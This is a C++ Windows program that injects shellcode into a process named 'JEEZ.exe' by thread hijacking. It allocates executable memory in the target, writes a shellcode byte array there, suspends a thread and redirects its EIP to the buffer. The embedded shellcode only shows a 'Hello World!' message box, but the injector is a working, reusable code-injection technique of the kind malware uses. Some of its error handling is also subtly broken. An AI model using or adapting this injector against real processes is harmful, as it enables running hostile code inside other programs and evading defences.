#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <iomanip>
#include <Shlwapi.h>
#include <thread>
#include <stdio.h>
#pragma comment( lib, "shlwapi.lib")

#define print(format, ...) fprintf (stderr, format, __VA_ARGS__)

DWORD GetPID(const char* pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!_stricmp(pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    print("[+] Process %s found : 0x%lX\n", pE.szExeFile, pE.th32ProcessID);
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

DWORD EnThread(DWORD procID)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD ThID;
    if (procID == 0x0)
        EXIT_FAILURE;
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Thread32First(hSnap, &pE))
        {
            do
            {
                if (procID == pE.th32OwnerProcessID)
                {
                    ThID = pE.th32ThreadID;
                    print("[+] Thread found : 0x%lX\n", pE.th32OwnerProcessID);
                    break;
                }
            } while (Thread32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return(ThID);
}

int main(void)
{
    unsigned char ExecBuffer[] =
        "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
        "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
        "\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
        "\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
        "\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
        "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
        "\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
        "\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
        "\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
        "\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
        "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
        "\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
        "\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
        "\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
        "\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
        "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
        "\x54\x53\xff\xd6\x57\xff\xd0";
        DWORD pr;
        CONTEXT context;
        context.ContextFlags = CONTEXT_FULL;
        HANDLE htd,proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("JEEZ.exe"));
        if (!proc)
        {
            print("[!] Process Not found (0x%lX)\n", GetLastError());
            return -1;
        }
        print("[+] Process Opened Successfully :0x%lX\n", GetLastError());
        void* base = VirtualAllocEx(proc, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!base)
        {
            CloseHandle(proc);
            return -1;
        }
        if (!WriteProcessMemory(proc, base, ExecBuffer, sizeof(ExecBuffer), 0))
        {
            CloseHandle(proc);
            return -1;
        }
        print("[+] shellcode Base address : 0x%08x\n", base);
        htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
        if (!htd)
        {
            CloseHandle(proc);
            return -1;
        }
        if (SuspendThread(htd) == (DWORD)-1)
        {
            CloseHandle(proc);
            CloseHandle(htd);
            return -1;
        }
        if (!GetThreadContext(htd, &context))
        {
            ResumeThread(htd);
            CloseHandle(proc);
            CloseHandle(htd);
            return -1;
        }
        print("[+] EIP hold: 0x%08x\n", context.Eip); 
        context.Eip = (DWORD)base;
        if (!SetThreadContext(htd, &context))
        {
            ResumeThread(htd);
            CloseHandle(proc);
            CloseHandle(htd);
            return -1;
        }
       
        print("[+] EIP Hijacked succesfully : 0x%08x\n", context.Eip);
        if (ResumeThread(htd) == (DWORD)-0b01)
        {
            CloseHandle(proc);
            CloseHandle(htd);
            return -1;
        }
        print("[+] thread Resumed succesfully : 0x%08x\n", context.Eip);
        if ((pr = WaitForSingleObject(htd, INFINITE) == 0x00000080L) || (pr == 0x00000000L) || (pr == 0x00000102L) || (pr == (DWORD)0xFFFFFFFF))
        {
            CloseHandle(proc);
            CloseHandle(htd);
            return -1;
        }
        print("[+] Thread finished Succesfully 0x%lX\n", htd);
        CloseHandle(proc);
        CloseHandle(htd);
        __asm
        {
            xor eax, eax
        }
}
